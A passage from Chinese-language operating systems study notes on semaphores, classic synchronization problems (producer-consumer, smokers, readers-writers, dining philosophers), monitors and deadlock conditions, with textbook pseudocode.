class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对信号量S的一次P操作意味着进程请求一个单位的该类资源，因此需要执行<code>S.value--;</code>，表示资源数减1，当<code>S.value&lt;0</code>时表示该类资源已分配完毕，因此进程应调用block原语进行自我阻塞(当前运行的进程从运行态 -&gt; 阻塞态)，主动放弃处理机，并插入该类资源的等待队列S.L中。可见，该机制遵循了“让权等待”原则，不会出现“忙等”现象。</p><p>对信号量S的一次V操作意味着进程释放一个单位的该类资源，因此需要执行<code>S.value++;</code>，表示资源数加1，若加1后仍是<code>S.value&lt;=0</code>，表示依然有进程在等待该类资源，因此应调用wakeup原语唤醒等待队列中的第一个进程(被唤醒进程从阻塞态 -&gt; 就绪态)。</p><h3 id="2-10-3-用信号量实现进程互斥、同步、前驱关系"><a href="#2-10-3-用信号量实现进程互斥、同步、前驱关系" class="headerlink" title="2.10.3 用信号量实现进程互斥、同步、前驱关系"></a>2.10.3 用信号量实现进程互斥、同步、前驱关系</h3><h4 id="2-10-3-1-实现进程互斥"><a href="#2-10-3-1-实现进程互斥" class="headerlink" title="2.10.3.1 实现进程互斥"></a>2.10.3.1 实现进程互斥</h4><ol><li>分析并发进程的关键活动，划定临界区(如：对临界资源打印机的访问就应放在临界区)</li><li>设置互斥信号量mutex，初值为1</li><li>在临界区之前执行P(mutex)</li><li>在临界区之后执行V(mutex)</li></ol><p>注意：对不同的临界资源需要设置不同的互斥信号量。P、V操作必须成对出现，缺少P(mutex)就不能保证临界资源的互斥访问；缺少V(mutex)会导致资源永不被释放，等待进程永不被唤醒。</p><h4 id="2-10-3-2-实现进程同步"><a href="#2-10-3-2-实现进程同步" class="headerlink" title="2.10.3.2 实现进程同步"></a>2.10.3.2 实现进程同步</h4><p>进程同步：要让各并发进程按要求有序地推进。</p><ol><li>分析什么地方需要实现“同步关系”，即必须保证“一前一后”执行的两个操作(或两句代码)</li><li>设置同步信号量S，初始为0</li><li>在“前操作”之后执行V(S)</li><li>在“后操作”之前执行P(S)</li></ol><p>如何保证代码2在代码4之前？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">semaphore S = <span class="number">0</span>;<span class="comment">//初始化同步信号量，初始值为0</span></span><br><span class="line">P1()</span><br><span class="line">{</span><br><span class="line">    代码<span class="number">1</span>;</span><br><span class="line">    代码<span class="number">2</span>;</span><br><span class="line">    V(S);</span><br><span class="line">    代码<span class="number">3</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">P2()</span><br><span class="line">{</span><br><span class="line">    P(S);</span><br><span class="line">    代码<span class="number">4</span>;</span><br><span class="line">    代码<span class="number">5</span>;</span><br><span class="line">    代码<span class="number">6</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>若先执行到V(S)操作，则S++后S=1。之后当执行到P(S)操作时，由于S=1，表示有可用资源，会执行S—，S的值变回0，P2进程不会执行block原语，而是继续往下执行代码4。</p><p>若先执行到P(S)操作，由于S=0，S—后S=-1，表示此时没有可用资源，因此P操作中会执行block原语，主动请求阻塞。之后当执行完代码2，继而执行V(S)操作，S++，使S变回0，由于此时有进程在该信号量对应的阻塞队列中，因此会在V操作中执行wakeup原语，唤醒P2进程。这样P2就可以继续执行代码4了。</p><h4 id="2-10-3-3-实现前驱关系"><a href="#2-10-3-3-实现前驱关系" class="headerlink" title="2.10.3.3 实现前驱关系"></a>2.10.3.3 实现前驱关系</h4><p>进程P1中有句代码S1，P2中有句代码S2，…，P6中有句代码S6。这些代码要求按如下前驱图所示的顺序来执行：</p><img src="/posts/d04bd5bc/2.10.3.3.png" class="" title="前驱图"><img src="/posts/d04bd5bc/2.10.3.3.1.png" class="" title="前驱图"><h3 id="2-10-4-生产者-消费者问题"><a href="#2-10-4-生产者-消费者问题" class="headerlink" title="2.10.4 生产者-消费者问题"></a>2.10.4 生产者-消费者问题</h3><p>系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者进程每次从缓冲区中去除一个产品并使用。(注：这里的“产品”理解为某种数据)</p><p>生产者、消费者共享一个初始为空、大小为n的缓冲区。只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待。只有缓冲区不空时，消费者才能从中取出产品，否则必须等待。缓冲区是临界资源，各进程必须互斥地访问。</p><p>如何用信号量机制(P、V操作)实现生产者、消费者进程的这些功能呢？信号量机制可实现互斥、同步、对一类系统资源的申请和释放。</p><p>互斥：设置初值为1的互斥信号量</p><p>同步：设置初值为0的同步信号量(实现“一前一后”)</p><p>对一类系统资源的申请和释放：设置一个信号量，初始值即为资源的数量(本质上也属于“同步问题”，若无空闲资源，则申请资源的进程需要等待别的进程释放资源后才能继续往下执行)</p><p>PV操作题目分析步骤：</p><ol><li><p>关系分析。找出题目中描述的各个进程，分析它们之间的同步、互斥关系。</p></li><li><p>整理思路。根据各进程的操作流程确定P、V操作的大致顺序。</p><p>生产者每次要消耗(P)一个空闲缓冲区，并生产(V)一个产品；消费者每次要消耗(P)一个产品，并释放一个空闲缓冲区(V)。往缓冲区放入/取走产品需要互斥。</p></li><li><p>设置信号量。设置需要的信号量，并根据题目条件确定信号量初值。(互斥信号量初值一般为1，同步信号量的初始值要看对应资源的初始值是多少)</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//互斥信号量，实现对缓冲区的互斥访问</span></span><br><span class="line">semaphore empty = n;<span class="comment">//同步信号量，表示空闲缓冲区的数量</span></span><br><span class="line">semaphore full = <span class="number">0</span>;<span class="comment">//同步信号量，表示产品的数量，也即非空缓冲区的数量</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">producer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        生产一个产品;</span><br><span class="line">        P(empty);<span class="comment">//消耗一个空闲缓冲区</span></span><br><span class="line">        P(mutex);<span class="comment">//实现互斥是在同一进程中进行一对PV操作</span></span><br><span class="line">        把产品放入缓冲区;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(full);<span class="comment">//增加一个产品</span></span><br><span class="line">        <span class="comment">//V(full)和下面的P(full)实现两进程的同步关系，是在其中一个进程中执行P，另一进程中执行V</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">consumer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(full);<span class="comment">//消耗一个产品(非空缓冲区)</span></span><br><span class="line">        P(mutex);</span><br><span class="line">        从缓冲区取出一个产品;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);<span class="comment">//增加一个空闲缓冲区</span></span><br><span class="line">        使用产品;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>如果将生产者进程和消费者进程里面的两个P互换位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">producer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        生产一个产品;</span><br><span class="line">        P(mutex);①</span><br><span class="line">        P(empty);②</span><br><span class="line">        把产品放入缓冲区;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(full);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">consumer()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(mutex);③</span><br><span class="line">        P(full);④</span><br><span class="line">        从缓冲区取出一个产品;</span><br><span class="line">        V(mutex);</span><br><span class="line">        V(empty);</span><br><span class="line">        使用产品;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>若此时缓冲区内已经放满产品，也就是empty = 0，full = n。则生产者进程执行①使mutex变为0，再执行②，由于已没有空闲缓冲区，因此生产者被阻塞。由于生产者阻塞，因此切换回消费者进程。消费者进程执行③，由于mutex为0，即生产者还没释放对临界资源的“锁”，因此消费者也被阻塞。这就造成了生产者等待消费者释放空闲缓冲区，而消费者又等待生产者释放临界区的情况，生产者和消费者循环等待被对方唤醒，出现“死锁”。</p><p>同样的，若缓冲区中没有产品，即full = 0，empty = n。按③④①的顺序执行也会发生死锁。因此，实现互斥的P操作一定要在实现同步的P操作之后。</p><h3 id="2-10-5-多类生产者-多类消费者问题"><a href="#2-10-5-多类生产者-多类消费者问题" class="headerlink" title="2.10.5 多类生产者-多类消费者问题"></a>2.10.5 多类生产者-多类消费者问题</h3><p>桌子上有一只盘子，每次只能向其中放入一个水果。爸爸专向盘子中放苹果，妈妈专向盘子中放橘子，儿子专等着吃盘子中的橘子，女儿专等着吃盘子中的苹果。只有盘子空时，爸爸或妈妈才可向盘子中放一个水果。仅当盘子中有自己需要的水果时，儿子或女儿可以从盘子中取出水果。用PV操作实现上述过程。</p><ol><li><p>关系分析。</p><p>互斥关系：对缓冲区(盘子)的访问要互斥地进行</p><p>同步关系(一前一后)：</p><ul><li>父亲将苹果放入盘子后，女儿才能取苹果</li><li>母亲将橘子放入盘子后，儿子才能取橘子</li><li>只有盘子为空时，父亲或母亲才能放入水果(“盘子为空”这个事件可以由儿子或女儿触发，事件发生后才允许父亲或母亲放水果)</li></ul></li><li><p>整理思路。</p><p>互斥：在临界区前后分别PV</p><p>同步：前V后P</p></li><li><p>设置信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//实现互斥访问盘子</span></span><br><span class="line">semaphore apple = <span class="number">0</span>;<span class="comment">//盘子中有几个苹果</span></span><br><span class="line">semaphore orange = <span class="number">0</span>;<span class="comment">//盘子中有几个橘子</span></span><br><span class="line">semaphore plate = <span class="number">1</span>;<span class="comment">//盘子中还可以放多少个水果</span></span><br></pre></td></tr></table></figure></li></ol><img src="/posts/d04bd5bc/2.10.5.1.png" class="" title="多生产者-多消费者"><img src="/posts/d04bd5bc/2.10.5.2.png" class="" title="多生产者-多消费者"><p>原因在于：本题中的缓冲区大小为1，在任何时刻，apple、orange、plate三个同步信号量中最多只有一个是1。因此在任何时刻，最多只有一个进程的P操作不会被阻塞，并顺利地进入临界区。</p><img src="/posts/d04bd5bc/2.10.5.3.png" class="" title="多生产者-多消费者"><p>但加上总没错，设置互斥信号量就对了。</p><h3 id="2-10-6-吸烟者问题"><a href="#2-10-6-吸烟者问题" class="headerlink" title="2.10.6 吸烟者问题"></a>2.10.6 吸烟者问题</h3><p>假设一个系统有三个吸烟者进程和一个供应者进程。每个抽烟者不停地卷烟并抽掉它，但是要卷起并抽掉一支烟，抽烟需要有三种材料：烟草、纸和胶水。三个抽烟者中，第一个拥有烟草、第二个拥有纸、第三个拥有胶水。供应者进程无限地提供三种材料，供应者每次将两种材料放桌子上，拥有剩下那种材料的抽烟者卷一根烟并抽掉它，并给供应者进程一个信号告诉完成了，供应者就会放另外两种材料在桌上，这个过程一直重复(让三个抽烟者轮流抽烟)。</p><p>本质上这题也属于“生产者-消费者”问题，更详细的说应该是“可生产多种产品的单生产者-多消费者”。</p><ol><li><p>关系分析。</p><p>互斥：桌子可以抽象为容量为1的缓冲区，要互斥访问</p><ul><li>组合一：纸+胶水</li><li>组合二：烟草+胶水</li><li>组合三：烟草+纸</li></ul><p>同步：</p><ul><li>桌上有组合一 -&gt; 第一个抽烟者取走东西</li><li>桌上有组合二 -&gt; 第二个抽烟者取走东西</li><li>桌上有组合三 -&gt; 第三个抽烟者取走东西</li><li>发出完成信号 -&gt; 供应者将下一个组合放到桌上</li></ul></li><li><p>整理思路。</p><p>互斥：在临界区前后分别PV</p><p>同步：前V后P</p></li><li><p>设置信号量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">semaphore offer1 = <span class="number">0</span>;<span class="comment">//桌上组合一的数量</span></span><br><span class="line">semaphore offer2 = <span class="number">0</span>;<span class="comment">//桌上组合二的数量</span></span><br><span class="line">semaphore offer3 = <span class="number">0</span>;<span class="comment">//桌上组合三的数量</span></span><br><span class="line">semaphore finish = <span class="number">0</span>;<span class="comment">//抽烟是否完成</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//用于实现“三个抽烟者轮流抽烟”</span></span><br></pre></td></tr></table></figure></li></ol><img src="/posts/d04bd5bc/2.10.5.4.png" class="" title="吸烟者问题"><h3 id="2-10-7-读者-写者问题"><a href="#2-10-7-读者-写者问题" class="headerlink" title="2.10.7 读者-写者问题"></a>2.10.7 读者-写者问题</h3><p>有读者和写者两组并发进程，共享一个文件，当两个或两个以上的读进程同时访问共享数据时不会产生副作用，但若某个写进程和其它进程(读进程或写进程)同时访问共享数据时则可能导致数据不一致的错误。因此要求：①允许多个读者可以同时对文件执行读操作；②只允许一个写者往文件中写信息；③任一写者在完成写操作之前不允许其它读者或写者工作；④写者执行写操作前，应让已有的读者和写者全部退出。</p><p>两类进程：写进程、读进程</p><p>互斥关系：写进程-写进程，写进程-读进程。读进程与读进程不存在互斥问题</p><p>写者进程和任何进程都互斥，设置一个互斥信号量rw，在写者访问共享文件前后分别执行P、V操作。读者进程和写者进程也要互斥，因此读者访问共享文件前后也要对rw执行P、V操作。如果所有读者进程在访问共享文件之前都执行P(rw)操作，那么会导致各个读进程之间也无法同时访问文件。Key：读者写者问题的核心思想——怎么处理该问题？</p><p>P(rw)和V(rw)其实就是对共享文件的“加锁”和“解锁”。既然各个读进程需要同时访问，而读进程与写进程又必须互斥访问，那么我们可以让第一个访问文件的读进程“加锁”，让最后一个访问完文件的读进程“解锁”。可以设置一个整数变量count来记录当前有几个读进程在访问文件。</p><img src="/posts/d04bd5bc/2.10.png" class="" title="读者写者问题"><img src="/posts/d04bd5bc/2.10.7.png" class="" title="读者写者问题"><h3 id="2-10-8-哲学家进餐问题"><a href="#2-10-8-哲学家进餐问题" class="headerlink" title="2.10.8 哲学家进餐问题"></a>2.10.8 哲学家进餐问题</h3><p>一张圆桌上坐着5名哲学家，每2个哲学家之间的桌上摆一根筷子，桌子的中间是一碗米饭。哲学家们倾注毕生的精力用于思考和进餐，哲学家在思考时，并不影响他人。只有当哲学家饥饿时，才试图拿起左、右两根筷子(一根一根地拿起)。如果筷子已在他人手上，则需等待。饥饿的哲学家只有同时拿起两根筷子才可以开始进餐，当进餐完毕后，放下筷子继续思考。</p><ol><li>关系分析。系统中有5个哲学家进程，5位哲学家与左右邻居对其中间筷子的访问是互斥关系。</li><li>整理思路。这个问题中只有互斥关系，但与之前遇到的问题不同的是，每个哲学家进程需要同时持有两个临界资源才能开始吃饭。如何避免临界资源分配不当造成的死锁现象，是哲学家问题的精髓。</li><li>信号量设置。定义互斥信号量数组chopstick[5]={1,1,1,1,1}用于实现对5个筷子的互斥访问。并对哲学家按0~4编号，哲学家i左边的筷子编号为i，右边的筷子编号为(i+1)%5。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>};</span><br><span class="line">Pi()</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(chopstick[i]);<span class="comment">//拿左</span></span><br><span class="line">        P(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//拿右</span></span><br><span class="line">        吃饭...</span><br><span class="line">        V(chopstick[i]);<span class="comment">//放左</span></span><br><span class="line">        V(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//放右</span></span><br><span class="line">        思考...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>以上当5个进程并发执行，每个哲学家同时拿起自己左边的筷子，在拿起右边的筷子的时候会发生阻塞，因为每个右边的筷子都被邻居占据了，每个哲学家都等待邻居放下筷子，造成“死锁”。</p><p>如何防止死锁的发生呢？</p><p>①可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐。这样可以保证至少有一个哲学家是可以拿到左右两支筷子的。</p><p>②要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一支筷子，另一个会直接阻塞。这就避免了占有一支后再等待另一支的情况。</p><p>③各个哲学家拿筷子这件事必须互斥地执行。这就保证了即使一个哲学家在拿筷子拿到一半时被阻塞，也不会有别的哲学家继续尝试拿筷子。这样的话，当前正在吃饭的哲学家放下筷子后，被阻塞的哲学家就可以获得等待的筷子了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">semaphore chopstick[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>};</span><br><span class="line">semaphore mutex = <span class="number">1</span>;<span class="comment">//互斥地取筷子</span></span><br><span class="line">Pi()<span class="comment">//i号哲学家的进程</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(mutex);</span><br><span class="line">        P(chopstick[i]);<span class="comment">//拿左</span></span><br><span class="line">        P(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//拿右</span></span><br><span class="line">        V(mutex);</span><br><span class="line">        吃饭...</span><br><span class="line">        V(chopstick[i]);<span class="comment">//放左</span></span><br><span class="line">        V(chopstick[(i+<span class="number">1</span>)%<span class="number">5</span>]);<span class="comment">//放右</span></span><br><span class="line">        思考...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-11-管程"><a href="#2-11-管程" class="headerlink" title="2.11 管程"></a>2.11 管程</h2><p>信号量机制存在的问题：编写程序困难、易出错，由此引入“管程”成分——一种高级同步机制。</p><p>管程是一种特殊的软件模块，由这些部分组成：</p><ul><li>局部于管程的共享数据结构说明</li><li>对该数据结构进行操作的一组过程</li><li>对局部于管程的共享数据设置初始值的语句</li><li>管程有一个名字</li></ul><p>管程的基本特征：</p><ul><li>局部于管程的数据只能被局部于管程的过程所访问</li><li>一个进程只有通过调用管程内的过程才能进入管程访问共享数据</li><li>每次仅允许一个进程在管程内执行某个内部过程</li></ul><h3 id="2-11-1-用管程解决生产者消费者问题"><a href="#2-11-1-用管程解决生产者消费者问题" class="headerlink" title="2.11.1 用管程解决生产者消费者问题"></a>2.11.1 用管程解决生产者消费者问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">monitor ProducerConsumer</span><br><span class="line">    condition full, empty;<span class="comment">//条件变量用来实现同步(排队)</span></span><br><span class="line"><span class="comment">//管程中设置条件变量和等待/唤醒操作，以解决同步问题</span></span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;<span class="comment">//缓冲区中的产品数</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">insert</span><span class="params">(Item item)</span>{<span class="comment">//把产品item放入缓冲区</span></span><br><span class="line">        <span class="comment">//由编译器负责实现各进程互斥地进入管程中的过程</span></span><br><span class="line">        <span class="keyword">if</span>(count == N)</span><br><span class="line">            wait(full);</span><br><span class="line">        count++;</span><br><span class="line">        insert_item(item);</span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">1</span>)</span><br><span class="line">            signal(empty);</span><br><span class="line">    }</span><br><span class="line">    Item <span class="title function_">remove</span><span class="params">()</span>{<span class="comment">//从缓冲区中取出一个产品</span></span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">            wait(empty);</span><br><span class="line">        count--;</span><br><span class="line">        <span class="keyword">if</span>(count == N<span class="number">-1</span>)</span><br><span class="line">            signal(full);</span><br><span class="line">        <span class="keyword">return</span> remove_item();</span><br><span class="line">    }</span><br><span class="line">end monitor;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者进程</span></span><br><span class="line">producer(){</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        item = 生产一个产品;</span><br><span class="line">        ProducerConsumer.insert(item);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者进程</span></span><br><span class="line">consumer(){</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        item = ProducerConsumer.remove();</span><br><span class="line">        消费产品item;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p><strong>每次仅允许一个进程在管程内执行某个内部过程。</strong></p><p>引入管程的目的无非就是要更方便地实现进程互斥和同步。</p><ol><li>需要在管程中定义共享数据(如生产者消费者问题的缓冲区)</li><li>需要在管程中定义用于访问这些共享数据的“入口”——其实就是一些函数(如生产者消费者问题中，可以定义一个函数用于将产品放入缓冲区，再定义一个函数用于从缓冲区取出产品)</li><li>只有通过这些特定的“入口”才能访问共享数据</li><li>管程中有很多“入口”，但是每次只能开放其中一个“入口”，并且只能让一个进程或线程进入(如生产者消费者问题中，各进程需要互斥地访问共享缓冲区。管程的这种特性即可保证一个时间段内最多只会有一个进程在访问缓冲区。注意：这种互斥特性是由编译器负责实现的，程序员不用关心)</li><li>可在管程中设置条件变量及等待/唤醒操作以解决同步问题。可以让一个进程或线程在条件变量上等待(此时，该进程应先释放管程的使用权，也就是让出“入口”)；可以通过唤醒操作将等待在条件变量上的进程或线程唤醒</li></ol><p>程序员可以用某种特殊的语法定义一个管程(比如：monitor ProducerConsumer…end monitor;)，之后其他程序员就可以使用这个管程提供的特定“入口”很方便地使用实现进程同步/互斥了。</p><h3 id="2-11-2-Java中类似于管程的机制"><a href="#2-11-2-Java中类似于管程的机制" class="headerlink" title="2.11.2 Java中类似于管程的机制"></a>2.11.2 Java中类似于管程的机制</h3><p>Java中，如果用关键字<code>synchronized</code>来描述一个函数，那么这个函数同一时间段内只能被一个线程调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">monitor</span>{</span><br><span class="line">    <span class="keyword">private</span> Item buffer[] = <span class="keyword">new</span> <span class="title class_">Item</span>[N];</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    每次只能有一个线程进入insert函数，如果多个线程同时调用insert函数，则后来者需要排队等待</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Item item)</span>{</span><br><span class="line">        ......</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-12-死锁"><a href="#2-12-死锁" class="headerlink" title="2.12 死锁"></a>2.12 死锁</h2><p>死锁：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p><p>饥饿：由于长期得不到想要的资源，某进程无法向前推进的现象。比如：在短进程优先(SPF)算法中，若有源源不断的短进程到来，则长进程将一直得不到处理机，从而发生长进程“饥饿”。</p><p>死循环：某进程执行过程中一直跳不出某个循环的现象。有时是因为程序逻辑bug导致的，有时是程序员故意设计的。</p><p>产生死锁必须同时满足以下四个条件，只要其中任一条件不成立，死锁就不会发生。</p><ul><li>互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁(如哲学家的筷子、打印机设备)</li><li>不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放</li><li>请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放</li><li>循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求</li></ul><p>什么时候会发生死锁？</p><ul><li>对系统资源的竞争。各进程对不可剥夺的资源(如打印机)的竞争可能引起死锁，对可剥夺的资源(CPU)的竞争是不会引起死锁的</li><li>进程推进顺序非法。请求和释放资源的顺序不当，也同样会导致死锁。例如，并发执行的进程P1、P2分别申请并占有了资源R1、R2，之后进程P1又紧接着申请资源R2，而进程P2又申请资源R1，两者会因为申请的资源被对方占有而阻塞，从而发生死锁</li><li>信号量的使用不当也会造成死锁。如生产者-消费者问题中，如果实现互斥的P操作在实现同步的P操作之前，就有可能导致死锁(可以把互斥信号量、同步信号量也看作是一种抽象的系统资源)</li></ul><h3 id="2-12-1-死锁的处理策略——预防死锁"><a href="#2-12-1-死锁的处理策略——预防死锁" class="headerlink" title="2.12.1 死锁的处理策略——预防死锁"></a>2.12.1 死锁的处理策略——预防死锁</h3><p>我们知道，死锁的产生必须是满足四个必要条件，只要其中一个或几个条件不满足，死锁就不会发生。</p><h4 id="2-12-1-1-破坏互斥条件"><a href="#2-12-1-1-破坏互斥条件" class="headerlink" title="2.12.1.1 破坏互斥条件"></a>2.12.1.1 破坏互斥条件</h4><p>互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁。</p><p>如果把只能互斥使用的资源改造为允许共享使用，则系统不会进入死锁状态。比如：<strong>SPOOLing技术</strong>。操作系统可以采用SPOOLing技术把独占设备在逻辑上改造成共享设备。比如，用SPOOLing技术将打印机改造为共享设备。</p><img src="/posts/d04bd5bc/2.12.1.1.png" class="" title="SPPOLing技术"><p>该策略的缺点：并不是所有的资源都可以改造成可共享使用的资源。并且为了系统安全，很多地方还必须保护这种互斥性。因此，很多时候都无法破坏互斥条件。</p><h4 id="2-12-1-2-破坏不剥夺条件"><a href="#2-12-1-2-破坏不剥夺条件" class="headerlink" title="2.12.1.2 破坏不剥夺条件"></a>2.12.1.2 